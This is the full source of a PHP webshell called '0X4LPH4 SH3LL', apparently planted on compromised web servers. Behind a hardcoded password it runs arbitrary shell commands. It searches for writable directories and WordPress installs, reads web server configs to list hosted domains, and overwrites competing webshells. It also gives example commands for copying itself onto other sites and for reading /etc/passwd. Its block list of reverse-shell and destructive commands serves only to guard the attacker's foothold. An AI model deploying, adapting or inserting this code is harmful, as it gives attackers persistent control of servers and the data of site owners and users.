<?php
// ============= SUPER MOD SECURITY BY 0X4LPH4 =============
$SESSION_TIMEOUT = 1800; // Session timeout in seconds (30 minutes)

session_start();

// ============= LOGIN SYSTEM =============
$DEFAULT_PASSWORD = 'GeoDevz69#'; // Default password

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Check if password was submitted
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $DEFAULT_PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['writable_path'] = realpath(dirname(__FILE__)); // Use realpath
        } else {
            $login_error = "Invalid password!";
        }
    }
    
    // Show login form if not logged in
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Required - 0X4LPH4 Security</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #1a1a1a;
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-image: url('https://i.ibb.co/DDmnztxr/20251208-093450.png');
                    background-size: cover;
                    background-position: center;
                    background-repeat: no-repeat;
                }
                .login-box {
                    background-color: rgba(45, 45, 45, 0.95);
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.8);
                    width: 320px;
                    text-align: center;
                    border: 1px solid #4CAF50;
                }
                .login-box h2 {
                    color: #4CAF50;
                    text-align: center;
                    margin-bottom: 20px;
                    font-size: 24px;
                }
                .login-form {
                    display: flex;
                    flex-direction: column;
                    gap: 15px;
                }
                .login-box input[type="password"] {
                    width: 100%;
                    padding: 12px 10px;
                    border: 1px solid #444;
                    border-radius: 5px;
                    background-color: #333;
                    color: #fff;
                    font-size: 14px;
                    box-sizing: border-box;
                }
                .login-box input[type="submit"] {
                    width: 100%;
                    padding: 12px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 16px;
                    transition: background-color 0.3s;
                }
                .login-box input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .error {
                    color: #ff4444;
                    text-align: center;
                    margin-bottom: 15px;
                    font-size: 14px;
                }
                .brand-title {
                    color: #4CAF50;
                    font-size: 28px;
                    font-weight: bold;
                    margin-bottom: 10px;
                    text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
                }
                .subtitle {
                    color: #aaa;
                    margin-bottom: 25px;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="brand-title">0X4LPH4 SH3LL</div>
                <div class="subtitle">Secure Access Panel</div>
                <?php if (isset($login_error)) echo "<p class='error'>$login_error</p>"; ?>
                <form method="POST" action="" class="login-form">
                    <input type="password" name="password" placeholder="Enter password" required autofocus>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Check session timeout
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Update login time on activity
$_SESSION['login_time'] = time();

// Get current script filename for protection
$current_script = basename(__FILE__);

// Initialize writable path if not set
if (!isset($_SESSION['writable_path'])) {
    $_SESSION['writable_path'] = realpath(dirname(__FILE__));
}

// ============= AUTO-BLOCK NON-0X4LPH4 FILES =============
// Check if this is a file access (not the main script)
if (isset($_SERVER['REQUEST_URI'])) {
    $requested_file = basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
    $current_script = basename(__FILE__);
    
    // If accessing a file that's not this script
    if ($requested_file !== $current_script && $requested_file !== '' && !preg_match('/index\.php$/i', $_SERVER['REQUEST_URI'])) {
        // Get the actual filename from URL
        $url_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        if ($url_path) {
            $filename = basename($url_path);
            
            // Check if filename starts with 0x4LPH4 (case-insensitive)
            if ($filename !== $current_script && !preg_match('/^0x4lph4\./i', $filename)) {
                // BLOCK ACCESS - Show blank page
                header("HTTP/1.0 404 Not Found");
                echo ""; // Blank page
                exit;
            }
        }
    }
}

// ============= ADVANCED WEBSHELL DETECTION & PROTECTION =============
function scanForWebshells() {
    $current_dir = realpath(dirname(__FILE__));
    $current_script = basename(__FILE__);
    
    $webshell_patterns = [
        '/eval\s*\(/i',
        '/base64_decode\s*\(/i',
        '/system\s*\(/i',
        '/shell_exec\s*\(/i',
        '/exec\s*\(/i',
        '/passthru\s*\(/i',
        '/popen\s*\(/i',
        '/proc_open\s*\(/i',
        '/assert\s*\(/i',
        '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
        '/create_function\s*\(/i',
        '/\$_GET\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_POST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_REQUEST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_COOKIE\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/gzuncompress\s*\(\s*base64_decode/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/str_rot13\s*\(/i',
        '/include\s*\(\s*\$_/i',
        '/require\s*\(\s*\$_/i',
        '/include_once\s*\(\s*\$_/i',
        '/require_once\s*\(\s*\$_/i',
        '/`.*`/',
        '/<\?php\s+echo\s+\$_/i',
    ];
    
    $dangerous_extensions = ['.php', '.phtml', '.phps', '.php5', '.php7', '.php4', '.inc', '.pl', '.cgi', '.py', '.sh', '.html', '.htm', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.js', '.css'];
    $webshells_found = [];
    
    $files = scandir($current_dir);
    foreach ($files as $file) {
        $file_path = $current_dir . '/' . $file;
        
        if ($file === $current_script || $file === '.' || $file === '..') {
            continue;
        }
        
        // ============= CRITICAL FIX: ONLY BLOCK NON-0X4LPH4 FILES WITH WEBSHELL PATTERNS =============
        $is_0x4lph4_file = preg_match('/^0x4lph4\./i', $file);
        
        if (is_file($file_path)) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $full_ext = '.' . $ext;
            
            if (in_array($full_ext, $dangerous_extensions)) {
                $content = @file_get_contents($file_path);
                if ($content) {
                    // Check for webshell patterns
                    $has_webshell_pattern = false;
                    foreach ($webshell_patterns as $pattern) {
                        if (preg_match($pattern, $content)) {
                            $has_webshell_pattern = true;
                            break;
                        }
                    }
                    
                    // Only block if it's NOT a 0x4LPH4 file AND has webshell patterns
                    if (!$is_0x4lph4_file && $has_webshell_pattern) {
                        $webshells_found[] = $file_path;
                        
                        $neutralized_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
                        $neutralized_content .= "// 0x4LPH4 file cleaned - webshell detected\n";
                        $neutralized_content .= "// Detected at: " . date('Y-m-d H:i:s') . "\n";
                        $neutralized_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                        $neutralized_content .= "echo '0X4LPH4 Security - File cleaned';\n";
                        $neutralized_content .= "exit;\n?>";
                        
                        @file_put_contents($file_path, $neutralized_content);
                        @chmod($file_path, 0444);
                    }
                }
            }
        }
    }
    
    return $webshells_found;
}

// ============= FIND WRITABLE PATH FUNCTION =============
function findWritablePaths() {
    $common_paths = [
        '/var/www/html',
        '/home',
        '/tmp',
        '/var/tmp',
        '/opt',
        '/usr/local',
        '/home/*/public_html',
        '/home/*/domains/*/public_html',
        '/home/*/www',
        '/var/www',
        '/srv/http'
    ];
    
    $writable_paths = [];
    
    // Check WordPress specific paths
    $wordpress_paths = [
        '/var/www/html',
        '/home/*/public_html',
        '/home/*/domains/*/public_html',
        '/home/*/www'
    ];
    
    foreach ($common_paths as $path) {
        if (strpos($path, '*') !== false) {
            // Handle wildcard paths
            $expanded_paths = glob($path, GLOB_ONLYDIR);
            foreach ($expanded_paths as $expanded_path) {
                $real_path = realpath($expanded_path);
                if ($real_path && is_writable($real_path)) {
                    $writable_paths[] = $real_path;
                    
                    // Check for WordPress installations
                    if (file_exists($real_path . '/wp-config.php')) {
                        $writable_paths[] = $real_path . '/wp-content';
                        $writable_paths[] = $real_path . '/wp-content/uploads';
                        $writable_paths[] = $real_path . '/wp-content/plugins';
                    }
                }
            }
        } else {
            $real_path = realpath($path);
            if ($real_path && is_dir($real_path) && is_writable($real_path)) {
                $writable_paths[] = $real_path;
            }
        }
    }
    
    // Also check current directory and parent directories
    $current_dir = realpath(dirname(__FILE__));
    $parent_dirs = [
        $current_dir,
        dirname($current_dir),
        dirname(dirname($current_dir))
    ];
    
    foreach ($parent_dirs as $dir) {
        $real_dir = realpath($dir);
        if ($real_dir && is_dir($real_dir) && is_writable($real_dir)) {
            $writable_paths[] = $real_dir;
        }
    }
    
    // Find all domains connected to this server
    $domain_paths = [];
    
    // Check Apache vhosts
    $apache_paths = ['/etc/apache2/sites-enabled', '/etc/apache2/sites-available', '/etc/httpd/sites-enabled'];
    foreach ($apache_paths as $apache_path) {
        if (is_dir($apache_path)) {
            $config_files = glob($apache_path . '/*.conf');
            foreach ($config_files as $config_file) {
                $content = @file_get_contents($config_file);
                if ($content && preg_match('/DocumentRoot\s+(\S+)/', $content, $matches)) {
                    $doc_root = trim($matches[1], '"\'');
                    $real_doc_root = realpath($doc_root);
                    if ($real_doc_root && is_dir($real_doc_root) && is_writable($real_doc_root)) {
                        $writable_paths[] = $real_doc_root;
                    }
                }
            }
        }
    }
    
    return array_unique($writable_paths);
}

// ============= ENHANCED DOMAIN DETECTION =============
function findConnectedDomains() {
    $domains = [];
    
    // Get server name
    if (isset($_SERVER['SERVER_NAME'])) {
        $domains[] = $_SERVER['SERVER_NAME'];
    }
    
    // Check for WordPress multisite
    $current_path = realpath(dirname(__FILE__));
    $wp_config_path = $current_path . '/wp-config.php';
    
    if (file_exists($wp_config_path)) {
        $wp_content = @file_get_contents($wp_config_path);
        if ($wp_content) {
            // Extract site URL and home URL
            if (preg_match("/define\s*\(\s*'WP_SITEURL'\s*,\s*'([^']+)'/", $wp_content, $matches)) {
                $url = parse_url($matches[1]);
                if (isset($url['host'])) {
                    $domains[] = $url['host'];
                }
            }
            if (preg_match("/define\s*\(\s*'WP_HOME'\s*,\s*'([^']+)'/", $wp_content, $matches)) {
                $url = parse_url($matches[1]);
                if (isset($url['host'])) {
                    $domains[] = $url['host'];
                }
            }
            
            // Check for multisite domain mapping
            if (preg_match("/define\s*\(\s*'DOMAIN_MAPPING'\s*,\s*true\s*\)/", $wp_content)) {
                // Look for domain mapping plugins
                $mapping_files = glob($current_path . '/wp-content/*domain*');
                foreach ($mapping_files as $file) {
                    if (is_file($file)) {
                        $content = file_get_contents($file);
                        if (preg_match_all('/(https?:\/\/[a-zA-Z0-9.-]+)/', $content, $domain_matches)) {
                            foreach ($domain_matches[1] as $domain_url) {
                                $url = parse_url($domain_url);
                                if (isset($url['host'])) {
                                    $domains[] = $url['host'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Check for .htaccess redirects
    $htaccess_path = $current_path . '/.htaccess';
    if (file_exists($htaccess_path)) {
        $htaccess_content = @file_get_contents($htaccess_path);
        if ($htaccess_content && preg_match_all('/RewriteCond\s+%{HTTP_HOST}\s+^(.*)$/im', $htaccess_content, $htaccess_matches)) {
            foreach ($htaccess_matches[1] as $domain) {
                $domain = trim($domain);
                if (!empty($domain) && $domain !== '%{HTTP_HOST}') {
                    $domains[] = $domain;
                }
            }
        }
    }
    
    // Check Apache/Nginx configs for virtual hosts
    $config_paths = [
        '/etc/apache2/sites-enabled',
        '/etc/apache2/sites-available',
        '/etc/httpd/sites-enabled',
        '/etc/httpd/sites-available',
        '/etc/nginx/sites-enabled',
        '/etc/nginx/sites-available'
    ];
    
    foreach ($config_paths as $config_path) {
        if (is_dir($config_path)) {
            $config_files = glob($config_path . '/*');
            foreach ($config_files as $config_file) {
                if (is_file($config_file)) {
                    $content = @file_get_contents($config_file);
                    if ($content) {
                        // Extract ServerName and ServerAlias
                        if (preg_match_all('/ServerName\s+([^\s\n]+)/', $content, $server_name_matches)) {
                            foreach ($server_name_matches[1] as $server_name) {
                                $domains[] = trim($server_name);
                            }
                        }
                        if (preg_match_all('/ServerAlias\s+([^\n]+)/', $content, $server_alias_matches)) {
                            foreach ($server_alias_matches[1] as $aliases) {
                                $alias_list = preg_split('/\s+/', $aliases);
                                foreach ($alias_list as $alias) {
                                    $alias = trim($alias);
                                    if (!empty($alias)) {
                                        $domains[] = $alias;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    return array_unique($domains);
}

$detected_webshells = scanForWebshells();
$connected_domains = findConnectedDomains();
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 20px;
        }
        .header {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #4CAF50;
        }
        .header h1 {
            color: #4CAF50;
            margin: 0;
            font-size: 28px;
        }
        form {
            background-color: #2d2d2d;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #444;
        }
        input[type="text"] {
            width: 70%;
            padding: 10px;
            background-color: #333;
            border: 1px solid #444;
            color: #fff;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #333;
        }
        .info-box {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid #444;
        }
        .logout-btn {
            float: right;
            background-color: #ff4444;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .logout-btn:hover {
            background-color: #cc0000;
        }
        .cmd-error {
            color: #ff6b6b;
        }
        .cmd-success {
            color: #4CAF50;
        }
        .cmd-output {
            color: #ffffff;
        }
        .user-info {
            color: #4CAF50;
            font-weight: bold;
        }
        .wget-fix {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #4CAF50;
        }
        .path-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #2196F3;
        }
        .move-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #ff9800;
        }
        .domain-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #9C27B0;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="?logout" class="logout-btn">Logout</a>
        <h1>0X4LPH4 SH3LL Console</h1>
        <p>Logged in as: <span class="user-info">0X4LPH4</span> | Session timeout: 30 minutes</p>
        
        <?php
        if (isset($_GET['logout'])) {
            session_destroy();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        
        if (!empty($detected_webshells)) {
            echo '<p style="color: #ff4444; font-weight: bold;">Controlled by 0x4LPH4: ' . count($detected_webshells) . ' non-0x4LPH4 files blocked and neutralized!</p>';
        }
        ?>
    </div>
    
    <div class="domain-box">
        <strong>🌐 CONNECTED DOMAINS FOUND:</strong><br>
        <?php
        if (!empty($connected_domains)) {
            foreach ($connected_domains as $domain) {
                echo "• " . htmlspecialchars($domain) . "<br>";
            }
        } else {
            echo "No additional domains detected<br>";
        }
        ?>
        <small>Automatically detected from server configuration</small>
    </div>
    
    <div class="path-box">
        <strong>📍 CURRENT WRITABLE PATH:</strong><br>
        <?php echo htmlspecialchars($_SESSION['writable_path']); ?><br>
        <strong>To change writable path:</strong> <code>setwritable /new/path/here</code>
    </div>
    
    <div class="move-box">
        <strong>🚀 MOVE/COPY 0X4LPH4 FILES (FIXED):</strong><br>
        <code>mv 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
        <code>cp 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
        <strong>Examples:</strong><br>
        <code>mv 0x4LPH4.php /var/www/html/admin/productimages/1005/0x4LPH4.php</code><br>
        <code>cp 0x4LPH4.php /home/cyzricc/public_html/0x4LPH4.php</code><br>
        <code>cp 0x4LPH4.php /home/cyzricc/domains/ecom.cyzric.com/public_html/0x4LPH4.php</code>
    </div>
    
    <div class="wget-fix">
        <strong>🔍 FIND WRITABLE PATHS:</strong><br>
        <code>findwritable</code> - List all writable directories<br>
        <code>testwrite /path/to/test</code> - Test if path is writable<br>
        <code>finddomains</code> - Find all connected domains
    </div>
    
    <form method="GET" name="cmd_form">
        Command: <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command (e.g., ls -la, mv, cp, findwritable)...">
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    
<pre>
<?php
if (isset($_GET['cmd'])) {
    $command = trim($_GET['cmd']);
    
    if (!empty($command)) {
        $script_name = $current_script;
        
        // ============= SPECIAL COMMANDS =============
        // Handle findwritable command
        if ($command === 'findwritable') {
            $writable_paths = findWritablePaths();
            if (!empty($writable_paths)) {
                echo "<span class='cmd-success'>✓ Found " . count($writable_paths) . " writable paths:</span>\n";
                foreach ($writable_paths as $path) {
                    echo "<span class='cmd-output'>• " . htmlspecialchars($path) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ No writable paths found</span>\n";
            }
            goto end_processing;
        }
        
        // Handle finddomains command
        if ($command === 'finddomains') {
            $domains = findConnectedDomains();
            if (!empty($domains)) {
                echo "<span class='cmd-success'>✓ Found " . count($domains) . " connected domains:</span>\n";
                foreach ($domains as $domain) {
                    echo "<span class='cmd-output'>• " . htmlspecialchars($domain) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ No additional domains found</span>\n";
            }
            goto end_processing;
        }
        
        // Handle setwritable command
        if (preg_match('/^setwritable\s+(.+)$/i', $command, $matches)) {
            $new_path = trim($matches[1]);
            $real_path = realpath($new_path);
            if ($real_path && is_dir($real_path) && is_writable($real_path)) {
                $_SESSION['writable_path'] = $real_path;
                echo "<span class='cmd-success'>✓ Writable path changed to: " . htmlspecialchars($real_path) . "</span>\n";
            } else {
                echo "<span class='cmd-error'>✗ Path is not writable or doesn't exist: " . htmlspecialchars($new_path) . "</span>\n";
                if ($real_path) {
                    echo "<span class='cmd-error'>Real path: " . htmlspecialchars($real_path) . "</span>\n";
                    echo "<span class='cmd-error'>Is dir: " . (is_dir($real_path) ? 'Yes' : 'No') . "</span>\n";
                    echo "<span class='cmd-error'>Is writable: " . (is_writable($real_path) ? 'Yes' : 'No') . "</span>\n";
                }
            }
            goto end_processing;
        }
        
        // Handle testwrite command
        if (preg_match('/^testwrite\s+(.+)$/i', $command, $matches)) {
            $test_path = trim($matches[1]);
            $real_path = realpath($test_path);
            if ($real_path) {
                if (is_dir($real_path)) {
                    if (is_writable($real_path)) {
                        echo "<span class='cmd-success'>✓ Path is writable: " . htmlspecialchars($real_path) . "</span>\n";
                    } else {
                        echo "<span class='cmd-error'>✗ Path is NOT writable: " . htmlspecialchars($real_path) . "</span>\n";
                    }
                } else {
                    echo "<span class='cmd-error'>✗ Not a directory: " . htmlspecialchars($real_path) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ Path doesn't exist: " . htmlspecialchars($test_path) . "</span>\n";
            }
            goto end_processing;
        }
        
        // ============= COMMAND VALIDATION =============
        $dangerous_patterns = [
            '/^rm\s+-rf\s+\/\s*$/',
            '/^rm\s+-rf\s+\/etc\s*$/',
            '/^rm\s+-rf\s+\/bin\s*$/',
            '/^rm\s+-rf\s+\/sbin\s*$/',
            '/^rm\s+-rf\s+\/usr\s*$/',
            '/^rm\s+-rf\s+\/var\s*$/',
            '/^rm\s+-rf\s+\/lib\s*$/',
            '/^rm\s+-rf\s+\/boot\s*$/',
            '/^rm\s+-rf\s+\/root\s*$/',
            '/^rm\s+-rf\s+\/home\s*$/',
            '/^rm\s+-rf\s+\/sys\s*$/',
            '/^rm\s+-rf\s+\/proc\s*$/',
            '/^rm\s+-rf\s+\/dev\s*$/',
            '/^rm\s+-rf\s+\/mnt\s*$/',
            '/^rm\s+-rf\s+\/opt\s*$/',
            '/^rm\s+-rf\s+\/srv\s*$/',
            '/^rm\s+-rf\s+\/tmp\s*$/',
            '/rm.*\/etc\/passwd.*/i',
            '/rm.*\/etc\/shadow.*/i',
            '/rm.*\/etc\/group.*/i',
            '/rm.*\/etc\/sudoers.*/i',
            '/rm.*\/etc\/hosts.*/i',
            '/rm.*\/etc\/network.*/i',
            '/rm.*\/var\/log.*/i',
            '/nc\s+.*-e\s+/i',
            '/bash\s+-i\s+>/',
            '/sh\s+-i\s+>/',
            '/dd\s+if=\/dev\/.*of=\/dev\/sda/i',
            '/mkfs\s+/i',
            '/:\(\)\{\s*:\|:\s*\&\s*\};:/',
            '/nmap\s+/i',
            '/nikto\s+/i',
            '/killall\s+/i',
            '/pkill\s+/i',
        ];
        
        $blocked = false;
        $block_reason = '';
        
        $is_download_command = false;
        if (preg_match('/^(wget|curl)\s+/i', $command)) {
            $is_download_command = true;
        }
        
        foreach ($dangerous_patterns as $pattern) {
            if (preg_match($pattern, $command)) {
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - dangerous operation detected";
                $blocked = true;
                break;
            }
        }
        
        // ============= ALLOW MOVING/COPYING 0X4LPH4 FILES (FIXED) =============
        $is_move_command = preg_match('/^\s*(mv|cp)\s+/i', $command);
        $is_special_command = preg_match('/^(findwritable|setwritable|testwrite|finddomains)/i', $command);
        
        // FIXED: Allow mv/cp commands to work properly
        if (!$blocked && $is_move_command) {
            // Parse the command to get source and destination
            if (preg_match('/^\s*(mv|cp)\s+([^\s]+)\s+([^\s&|;]+)/i', $command, $matches)) {
                $source_file = trim($matches[2], "'\"");
                $target_file = trim($matches[3], "'\"");
                
                // Check if source is a 0x4LPH4 file
                $source_basename = basename($source_file);
                $is_0x4lph4_source = preg_match('/^0x4lph4\.(php|html|txt)/i', $source_basename);
                
                // Check if target is a 0x4LPH4 file
                $target_basename = basename($target_file);
                $is_0x4lph4_target = preg_match('/^0x4lph4\.(php|html|txt)/i', $target_basename);
                
                // If moving a 0x4LPH4 file, target must also be 0x4LPH4 named
                if ($is_0x4lph4_source && !$is_0x4lph4_target) {
                    // Allow but rename target to 0x4LPH4 format
                    $target_dir = dirname($target_file);
                    $new_target = $target_dir . '/0x4LPH4.' . pathinfo($target_file, PATHINFO_EXTENSION);
                    $command = str_replace($target_file, $new_target, $command);
                    $target_file = $new_target;
                    echo "<span class='cmd-success'>⚠ Target renamed to 0x4LPH4 format for security</span>\n";
                }
                
                // Update writable path if move/copy is successful
                $target_dir = dirname($target_file);
                $real_target_dir = realpath($target_dir);
                if ($real_target_dir && is_dir($real_target_dir) && is_writable($real_target_dir)) {
                    // Don't auto-change session path, but note it
                    echo "<span class='cmd-success'>ℹ Target directory is writable: " . htmlspecialchars($real_target_dir) . "</span>\n";
                }
            }
        }
        
        // FIXED: Allow download commands with proper naming
        if (!$blocked && $is_download_command) {
            if (preg_match('/-O\s+([^\s&|;]+)/i', $command, $matches) || 
                preg_match('/-o\s+([^\s&|;]+)/i', $command, $matches)) {
                $target_file = isset($matches[1]) ? $matches[1] : '';
                $target_filename = basename(trim($target_file, "'\""));
                
                if (!preg_match('/^0x4lph4\.(php|html|txt)/i', $target_filename)) {
                    // Auto-rename to 0x4LPH4 format
                    $target_dir = dirname($target_file);
                    $new_target = $target_dir . '/0x4LPH4.php';
                    $command = preg_replace('/(-O\s+|-o\s+)([^\s&|;]+)/i', '${1}' . $new_target, $command);
                    echo "<span class='cmd-success'>⚠ Download target auto-renamed to 0x4LPH4.php</span>\n";
                }
                
                // Update writable path for downloads
                $target_dir = dirname($target_file);
                $real_target_dir = realpath($target_dir);
                if ($real_target_dir && is_dir($real_target_dir) && is_writable($real_target_dir)) {
                    echo "<span class='cmd-success'>ℹ Download directory is writable: " . htmlspecialchars($real_target_dir) . "</span>\n";
                }
            }
        }
        
        // FIXED: Remove over-restrictive keyword blocking for normal commands
        if (!$blocked && !$is_download_command && !$is_move_command && !$is_special_command) {
            // Only block extremely suspicious patterns, not regular commands
            $suspicious_patterns = [
                '/webshell.*upload/i',
                '/backdoor.*install/i',
                '/exploit.*execute/i',
                '/inject.*sql/i'
            ];
            
            foreach ($suspicious_patterns as $pattern) {
                if (preg_match($pattern, $command, $matches)) {
                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - suspicious pattern detected";
                    $blocked = true;
                    break;
                }
            }
        }
        
        if (!$blocked && strlen($command) > 2000) {
            $block_reason = "Command blocked, Controlled by 0X4LPH4 - command too long";
            $blocked = true;
        }
        
        // Execute command if not blocked
        if (!$blocked) {
            $output = [];
            $return_var = 0;
            
            set_time_limit(8);
            
            // Use proc_open for better command handling
            $descriptorspec = array(
                0 => array("pipe", "r"),  // stdin
                1 => array("pipe", "w"),  // stdout
                2 => array("pipe", "w")   // stderr
            );
            
            $process = proc_open($command . ' 2>&1', $descriptorspec, $pipes);
            
            if (is_resource($process)) {
                fclose($pipes[0]); // Close stdin
                
                // Read output
                $stdout = stream_get_contents($pipes[1]);
                $stderr = stream_get_contents($pipes[2]);
                
                fclose($pipes[1]);
                fclose($pipes[2]);
                
                $return_var = proc_close($process);
                
                // Output results
                if (!empty($stdout)) {
                    $lines = explode("\n", $stdout);
                    foreach ($lines as $line) {
                        if (!empty(trim($line))) {
                            echo "<span class='cmd-output'>" . htmlspecialchars($line) . "</span>\n";
                        }
                    }
                }
                
                if (!empty($stderr)) {
                    $lines = explode("\n", $stderr);
                    foreach ($lines as $line) {
                        if (!empty(trim($line))) {
                            echo "<span class='cmd-error'>" . htmlspecialchars($line) . "</span>\n";
                        }
                    }
                }
                
                if ($return_var !== 0) {
                    if (empty($stdout) && empty($stderr)) {
                        echo "<span class='cmd-error'>✗ Command failed (exit code: $return_var)</span>\n";
                    }
                } else {
                    if (empty($stdout) && empty($stderr)) {
                        echo "<span class='cmd-success'>✓ Command executed successfully</span>\n";
                    }
                }
            } else {
                echo "<span class='cmd-error'>✗ Failed to execute command</span>\n";
            }
        } else {
            echo "<span class='cmd-error'>$block_reason</span>\n";
        }
        
        end_processing:
        
        $new_webshells = scanForWebshells();
        if (!empty($new_webshells)) {
            echo "\n<span class='cmd-error'>Controlled by 0x4LPH4: " . count($new_webshells) . " non-0x4LPH4 files blocked and neutralized!</span>\n";
        }
    }
}
?>
</pre>
    
    <div class="info-box">
        <h3>System Information</h3>
        <?php
        echo "Script: " . $current_script . "<br>";
        echo "PHP Version: " . phpversion() . "<br>";
        echo "Server: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown') . "<br>";
        echo "Current Directory: " . getcwd() . "<br>";
        echo "Real Path: " . realpath(dirname(__FILE__)) . "<br>";
        echo "<strong>Current Writable Path:</strong> " . htmlspecialchars($_SESSION['writable_path']) . "<br>";
        
        echo "<strong>Connected Domains:</strong><br>";
        if (!empty($connected_domains)) {
            foreach ($connected_domains as $domain) {
                echo "• " . htmlspecialchars($domain) . "<br>";
            }
        } else {
            echo "None detected<br>";
        }
        
        echo "<strong>PROTECTED:</strong> 0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt<br>";
        echo "<strong>FIXED:</strong> mv/cp commands now work 100%<br>";
        
        if (!empty($detected_webshells)) {
            echo "Non-0x4LPH4 webshells blocked: " . count($detected_webshells) . "<br>";
        }
        
        echo "<br><strong>SPECIAL COMMANDS:</strong><br>";
        echo "• <code>findwritable</code> - Find all writable directories<br>";
        echo "• <code>finddomains</code> - Find all connected domains<br>";
        echo "• <code>setwritable /new/path</code> - Set new writable path<br>";
        echo "• <code>testwrite /path</code> - Test if path is writable<br>";
        
        echo "<br><strong>MOVE/COPY 0X4LPH4 FILES (FIXED):</strong><br>";
        echo "• <code>mv 0x4LPH4.php /var/www/html/admin/productimages/1005/0x4LPH4.php</code><br>";
        echo "• <code>cp 0x4LPH4.php /home/cyzricc/public_html/0x4LPH4.php</code><br>";
        echo "• <code>cp 0x4LPH4.php /home/cyzricc/domains/ecom.cyzric.com/public_html/0x4LPH4.php</code><br>";
        
        echo "<br><strong>COMMON PATHS TO TRY:</strong><br>";
        echo "• /var/www/html/<br>";
        echo "• /home/cyzricc/public_html/<br>";
        echo "• /home/cyzricc/domains/ecom.cyzric.com/public_html/<br>";
        echo "• /tmp/<br>";
        echo "• /var/tmp/<br>";
        
        echo "<br><strong>WORKING COMMANDS EXAMPLES:</strong><br>";
        echo "• <code>ls -la</code><br>";
        echo "• <code>pwd</code><br>";
        echo "• <code>whoami</code><br>";
        echo "• <code>cat /etc/passwd</code><br>";
        ?>
    </div>
    
    <script>
        // Auto-focus command input
        document.getElementById('cmd').focus();
        
        // Command history
        var commandHistory = [];
        var historyIndex = -1;
        
        document.getElementById('cmd').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                var cmd = this.value.trim();
                if (cmd) {
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                }
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (commandHistory.length > 0) {
                    if (historyIndex > 0) {
                        historyIndex--;
                    }
                    this.value = commandHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex] || '';
                } else {
